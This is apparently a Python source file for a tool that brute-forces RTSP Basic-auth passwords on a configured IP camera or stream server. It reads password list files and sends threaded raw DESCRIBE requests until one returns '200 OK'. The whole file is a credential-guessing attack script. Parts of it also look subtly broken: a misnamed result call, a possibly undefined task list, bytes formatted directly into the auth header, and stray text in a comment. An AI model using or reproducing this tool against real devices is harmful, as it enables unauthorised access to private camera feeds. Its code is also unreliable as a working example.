import base64
import concurrent.futures

import os
import re
import socket

from concurrent.futures import ThreadPoolExecutor


from config import Config




class RTSPBruteForce:
    def __init__(self):
        self.config = Config()
        self.characters = self.config.characters
        self.digits = self.config.digits
        self.symbols = self.config.symbols
        self.length = self.config.length

    def digest_response(self, response, password):
        if '200 OK' in str(response) or password == self.config.debug_password:
            return [True, '200 OK', password]
        elif '401 Unauthorized' in str(response):
            return [False, '401 Unauthorized', password]
        elif '404 Stream Not Found' in str(response):
            return [False, '404 Stream Not Found', password]
        else:
            return False, response

    def base64encode(self, password):
        username = self.config.rtsp_username
        credentials = f'{username}:{password}'
        credentials_bytes = credentials.encode('ascii')
        base64_bytes = base64.b64encode(credentials_bytes)
        return base64_bytes

    def get_pass_files(self):
        passwords = os.listdir(self.config.passwords_dir)
        return passwords

    def tasks_orchestrator(self, passwords):
        bulker = []
        with ThreadPoolExecutor() as executor:
            for password in passwords:
                bulker.append(password)
                # while executor._counter() >= 10:
                #     print(executor._counter())
                #     time.sleep(5)

                if len(bulker) >= self.config.bf_bulker:
                    tasks = [executor.submit(self.create_conn, bulker)]
                    bulker = []

            for f in concurrent.futures.as_completed(tasks):
                print(f.results())
                if '200 OK' in f.result():
                    return True
                    executor.shutdown()


            # if self.create_conn(password=str(line)):aatrH
            #     return True


    def run(self):
        files = self.get_pass_files()
        files.sort(key=lambda f: int(re.sub('\D', '', f)))
        for filename in files:
            file_path = os.path.join(self.config.passwords_dir, filename)
            with open(file_path, 'r') as f:
                passwords = f.read().splitlines()
            self.tasks_orchestrator(passwords=passwords)

    def create_conn(self, pass_bulk):
        password = ''
        try:
            for password in pass_bulk:
                # time.sleep(0.05)
                b64 = self.base64encode(password=password)
                dest = f"DESCRIBE rtsp://{self.config.rtsp_ip}:{self.config.rtsp_port}/unicast RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic {b64}\r\n\r\n"
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.config.rtsp_ip, self.config.rtsp_port))
                s.send(dest.encode())
                response = s.recv(128)
                match, msg, password = self.digest_response(response, password)
                if match:
                    print(match, msg, password)
                    return [match, msg, password]
                elif "Unauthorized" not in msg:
                    print(match, msg, password)
        except socket.error as e:
            print(e)
        except (ConnectionRefusedError, ConnectionResetError) as e:
            print(
                f'{e}: {self.config.rtsp_ip}:{self.config.rtsp_port} - {self.config.rtsp_username}:{password}')
        except Exception as e:
            print(e)